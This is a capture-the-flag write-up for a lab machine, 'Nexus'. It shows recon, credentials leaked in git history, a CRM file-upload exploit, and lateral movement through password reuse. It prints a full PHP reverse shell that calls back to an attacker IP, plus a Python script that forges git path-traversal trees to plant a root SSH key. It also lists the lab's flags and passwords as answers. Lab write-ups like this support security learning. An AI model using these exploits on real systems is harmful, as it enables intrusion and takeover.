# Guided mode
- [x] How many open TCP ports are listening on Nexus? *2*
- [x] What is the hiring manager's full email address? *j.matthew@nexus.htb*
- [x] What is the name of the additional subdomain hosting the Git service discovered during enumeration of nexus.htb? *git*
- [x] What is the DB_PASSWORD discovered while enumerating the exposed repository? *N27xh!!2ucY04*
- [x] What version of Krayin CRM is running on the billing subdomain? *2.2.0*
- [x] What CVE affects Krayin CRM version 2.2.0, allowing unrestricted PHP file upload leading to remote code execution? *CVE-2026-38526*
- [x] What is the password for jones discovered during post-exploitation? *y27xb3ha!!74GbR*
- [x] Submit the flag located in the jones user's home directory. *98f10f9994f75488de013943b3c18141*
- [x] What systemd timer triggers the template synchronization service? *gitea-template-sync.service*
- [x] Submit the flag located in the root user's home directory. *8305fc50d031a2418df347ee4f2226e6*
# IP
10.129.158.122
# Reconnaissance
## Host discovery
``` bash
ping -c 2 10.129.158.122
PING 10.129.158.122 (10.129.158.122) 56(84) bytes of data.
64 bytes from 10.129.158.122: icmp_seq=1 ttl=63 time=713 ms
64 bytes from 10.129.158.122: icmp_seq=2 ttl=63 time=358 ms

--- 10.129.158.122 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1010ms
rtt min/avg/max/mdev = 357.695/535.495/713.296/177.800 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.158.122
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 22:43 -0300
Nmap scan report for 10.129.158.122
Host is up (0.23s latency).
Not shown: 39032 closed tcp ports (reset), 26501 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.81 seconds
```
``` bash
sudo nmap -p22,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 10.129.158.122
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 22:44 -0300
Nmap scan report for 10.129.158.122
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.67 seconds
```
# Web enumeration
``` bash
curl http://10.129.158.122
<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.24.0 (Ubuntu)</center>
</body>
</html>
```
## DNS
``` bash
head -n 4 /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali.lab

10.129.158.122  nexus.htb
```
## DNS fuzzing
``` bash
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://nexus.htb  --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://nexus.htb
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
git.nexus.htb Status: 200 [Size: 14474]
billing.nexus.htb Status: 302 [Size: 390] [--> http://billing.nexus.htb/admin/login]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```
``` bash
head -n 6 /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali.lab

10.129.158.122  nexus.htb
10.129.158.122  git.nexus.htb
10.129.158.122  billing.nexus.htb
```
## Git subdomain
``` bash
git clone http://git.nexus.htb/admin/krayin-docker-setup
Cloning into 'krayin-docker-setup'...
remote: Enumerating objects: 8, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 8 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (8/8), done.
Resolving deltas: 100% (1/1), done.
```
``` bash
cat .env | grep -E 'DB_PASSWORD|DB_USERNAME'
DB_USERNAME=krayin
DB_PASSWORD=
```
### Commit history
``` bash
cat .env | grep -E 'DB_PASSWORD|DB_USERNAME'
DB_USERNAME=krayin
DB_PASSWORD=N27xh!!2ucY04
```
## Billing subdomain
``` bash
curl http://billing.nexus.htb
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url='http://billing.nexus.htb/admin/login'" />

        <title>Redirecting to http://billing.nexus.htb/admin/login</title>
    </head>
    <body>
        Redirecting to <a href="http://billing.nexus.htb/admin/login">http://billing.nexus.htb/admin/login</a>.
    </body>
</html>
```
## Login panel
The login panel is logable with the creds found *j.matthew@nexus.htb:N27xh!!2ucY04*
## Dashboard
On the dashboard, we can see the Krayin version running is 2.2.0
# Reverse shell
Looking for Krayin 2.2.0 common vulnerabilities found CVE-2026-38526
Download the php pentestmonkey reverse shell
``` bash
head rev.php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.114';
$port = 443;
$chunk_size = 1400;
$write_a = null;
``` 
Upload the shell creating Compressing a new mail
``` request
POST /admin/mail/create HTTP/1.1
Host: billing.nexus.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
X-XSRF-TOKEN: eyJpdiI6IkZDNVVJbTYwb0hOOThSQ1g3SldYcnc9PSIsInZhbHVlIjoibW03dFMyc2tjRUlKTFMyNDQyWUdjMzI4cEdFbzdyUW8yaFgrdWN5dmhiVUphYnZ6UlRRdm1NWGxkYXM1STFsNlVJODBWNTNQb3g3N2FMcC9YdlEzNmtpR210VTJyc0YrMmhDWWZ0dGtOM2tBRXpySkxpbGpQTjVjVXZHRXJLNnkiLCJtYWMiOiJmOTBiM2ZlMTA4NWZiZTAyOWQzMDI0NzJjZWY0YzAxNWQ4NDQ0ZDA1ZGI5NmJiODYyM2ZmNWRjYmRhMjlhN2RiIiwidGFnIjoiIn0=
Content-Type: multipart/form-data; boundary=----geckoformboundaryc219aa5db66b7294c134924b15f5e94c
Content-Length: 3512
Origin: http://billing.nexus.htb
Connection: keep-alive
Referer: http://billing.nexus.htb/admin/mail/inbox?openModal=true
Cookie: XSRF-TOKEN=eyJpdiI6IkZDNVVJbTYwb0hOOThSQ1g3SldYcnc9PSIsInZhbHVlIjoibW03dFMyc2tjRUlKTFMyNDQyWUdjMzI4cEdFbzdyUW8yaFgrdWN5dmhiVUphYnZ6UlRRdm1NWGxkYXM1STFsNlVJODBWNTNQb3g3N2FMcC9YdlEzNmtpR210VTJyc0YrMmhDWWZ0dGtOM2tBRXpySkxpbGpQTjVjVXZHRXJLNnkiLCJtYWMiOiJmOTBiM2ZlMTA4NWZiZTAyOWQzMDI0NzJjZWY0YzAxNWQ4NDQ0ZDA1ZGI5NmJiODYyM2ZmNWRjYmRhMjlhN2RiIiwidGFnIjoiIn0%3D; krayin_crm_session=eyJpdiI6IjFBcmRENElUeHl3YnU5U1dyWXlXSWc9PSIsInZhbHVlIjoibUVhdUw3Z3dCTndHZ0JjQW5GUjBlc1NTWjJDYVJkL3hEMm1hVUZWYWo1Rzg4YkFxdlozRlVia1k1OVJEK0dtaGVBT0J0ZUJ1L1BLYkt6ZFR4dGlSL0trZlZDQ01rN3NkVjU2V1NwRU5NWFFOMXdNTjlsSlZraTNPV20wakEvMDEiLCJtYWMiOiJjYWZmN2JkOWNmNTM4M2E4N2M3MTFjNjQ0ZjkzZmViNzJkNDY0YzQwYzNlMGUzM2M0NGMwM2U0MmIzMDAyY2UzIiwidGFnIjoiIn0%3D; dark_mode=1
Priority: u=0

------geckoformboundaryc219aa5db66b7294c134924b15f5e94c
Content-Disposition: form-data; name="id"


------geckoformboundaryc219aa5db66b7294c134924b15f5e94c
Content-Disposition: form-data; name="reply_to[0]"

j.matthew@nexus.htb
------geckoformboundaryc219aa5db66b7294c134924b15f5e94c
Content-Disposition: form-data; name="temp-reply_to"


------geckoformboundaryc219aa5db66b7294c134924b15f5e94c
Content-Disposition: form-data; name="subject"

test
------geckoformboundaryc219aa5db66b7294c134924b15f5e94c
Content-Disposition: form-data; name="reply"

<p>test</p>
------geckoformboundaryc219aa5db66b7294c134924b15f5e94c
Content-Disposition: form-data; name="attachments[]"; filename="rev.php"
Content-Type: application/x-php

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.114';
$port = 443;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
$pid = pcntl_fork();

if ($pid == -1) {
printit("ERROR: Can't fork");
exit(1);
}

if ($pid) {
exit(0);  // Parent exits
}
if (posix_setsid() == -1) {
printit("Error: Can't setsid()");
exit(1);
}

$daemon = 1;
} else {
printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
printit("$errstr ($errno)");
exit(1);
}

$descriptorspec = array(
0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
printit("ERROR: Can't spawn shell");
exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
if (feof($sock)) {
printit("ERROR: Shell connection terminated");
break;
}

if (feof($pipes[1])) {
printit("ERROR: Shell process terminated");
break;
}

$read_a = array($sock, $pipes[1], $pipes[2]);
$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

if (in_array($sock, $read_a)) {
if ($debug) printit("SOCK READ");
$input = fread($sock, $chunk_size);
if ($debug) printit("SOCK: $input");
fwrite($pipes[0], $input);
}

if (in_array($pipes[1], $read_a)) {
if ($debug) printit("STDOUT READ");
$input = fread($pipes[1], $chunk_size);
if ($debug) printit("STDOUT: $input");
fwrite($sock, $input);
}

if (in_array($pipes[2], $read_a)) {
if ($debug) printit("STDERR READ");
$input = fread($pipes[2], $chunk_size);
if ($debug) printit("STDERR: $input");
fwrite($sock, $input);
}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
if (!$daemon) {
print "$string\n";
}
}

?>

------geckoformboundaryc219aa5db66b7294c134924b15f5e94c
Content-Disposition: form-data; name="is_draft"

0
------geckoformboundaryc219aa5db66b7294c134924b15f5e94c--
```
``` response
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Content-Type: application/json
Connection: keep-alive
Cache-Control: no-cache, private
Date: Thu, 08 Oct 2026 02:55:35 GMT
phpdebugbar-id: 01M4CQ02VD9P8GNY4B2DNY0J7H
Set-Cookie: XSRF-TOKEN=eyJpdiI6IjBWMmVna1hUcnpLQTNqUUxQU0lYb2c9PSIsInZhbHVlIjoiRllYY0pJenFqRDgvbFNpQnFBd1NlMHZlS3hvVDNwZW1qd3Q1Q3FnV0RBK25DdVNQVlhOYVI4SUdDWXMxdjZCRW1Nc0VoUCs2YWQ0Z3N0elVjMEgxTmhHLzNUT0FSekx3Wis0L0JMWGtaYWxRMGt2UXhXYXNGOHlwdmZZQXhmTzIiLCJtYWMiOiJmYzEwNzY4MjRlMTIwOGRlOWZmOWFhOWM3ZWQxODgwMzdhNWQzZmVjNjVkYmE1Mzk0NDQ4OWEzMmViZjEwNDBkIiwidGFnIjoiIn0%3D; expires=Thu, 08 Oct 2026 04:55:35 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: krayin_crm_session=eyJpdiI6IkdIUmk1bkhob1NYQzhFTUZhb3BBNEE9PSIsInZhbHVlIjoia29UY0gwVXhKZUJrcUhCNGU0YTVMcE1TQzZFQ1MwMnhhQmpRVitCUWdGMnc2WWN6eExNQlhWV28yVjJ4VHVFSWhyWEpIS2RHRFdOOWk2bFF1ejZwYVNLZFF5VTI1TlgzRUNqaE5QS0pkSnhDU0ptb0RuS3RsaE5vVHMrdjY1bWwiLCJtYWMiOiJmY2FhOGYxZmZlZjQxNTZjYjg4YmNjZWE4NWQ5YjczYmU5YzdhMzM2NWUzNmI0MDRkMmQ4YzBlOTQ3OTE1MTIwIiwidGFnIjoiIn0%3D; expires=Thu, 08 Oct 2026 04:55:35 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Content-Length: 814

{"data":{"id":1,"subject":"test","source":"web","user_type":"admin","name":null,"reply":"<p>test<\/p>","is_read":null,"folders":["draft"],"from":"laravel@krayincrm.com","sender":null,"reply_to":["j.matthew@nexus.htb"],"cc":null,"bcc":null,"unique_id":"1791428115@webkul.com","message_id":"1791428115@webkul.com","reference_ids":["1791428115@webkul.com"],"person":null,"lead":null,"parent_id":null,"parent":null,"attachments":[{"id":1,"name":"rev.php","path":"emails\/1\/rev.php","url":"http:\/\/billing.nexus.htb\/storage\/emails\/1\/rev.php","size":2592,"content_type":"text\/x-php","content_id":null,"created_at":"2026-10-08T02:55:15.000000Z","updated_at":"2026-10-08T02:55:15.000000Z"}],"created_at":"2026-10-08T02:55:15.000000Z","updated_at":"2026-10-08T02:55:15.000000Z"},"message":"Email sent successfully."}
```
``` bash
sudo nc -lvnp 443
whoami
www-data
```
# Privilege escalation
``` bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
root:x:0:0:root:/root:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```
## Lateral movement www-data -> jones
``` bash
find / -name .env 2>/dev/null
/var/www/krayin/.env
```
``` bash
cat /var/www/krayin/.env | grep 'PASSWORD'
DB_PASSWORD=y27xb3ha!!74GbR
REDIS_PASSWORD=null
MAIL_PASSWORD=null
IMAP_PASSWORD=your_password
```
DB_PASSWORD is most likely jones's password
``` bash
su jones
```
# User flag
``` bash
 cat user.txt
98f10f9994f75488de013943b3c18141
```
## Lateral movement jones -> root
``` bash
systemctl list-timers
NEXT                            LEFT LAST                              PASSED UNIT                           ACTIVATES
Thu 2026-10-08 03:18:02 UTC      57s Thu 2026-10-08 03:17:02 UTC       2s ago gitea-template-sync.timer      gitea-template-sync.service
```
This is the escalation point. Reading /etc/gitea/template-sync.py encountered it has a path traversal vulnerability.
``` bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
chmod 600 /tmp/.k
```
Then sign in to gitea with the known creds *jones:y27xb3ha!!74GbR*
Create a repo and make sure to mark down the option: **Make repository a template** to enable the syncing script to run
``` bash
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/test.git
cd /test
touch README.md
vim build.py
```
``` python
# build.py
#!/usr/bin/env python3

import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)
r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```
``` bash
python3 build.py
```
``` bash
git push -u origin main --force
```
``` bash
ssh -i /tmp/.k root@nexus.htb
```
# Root flag
``` bash
cat /root/root.txt
8305fc50d031a2418df347ee4f2226e6
```
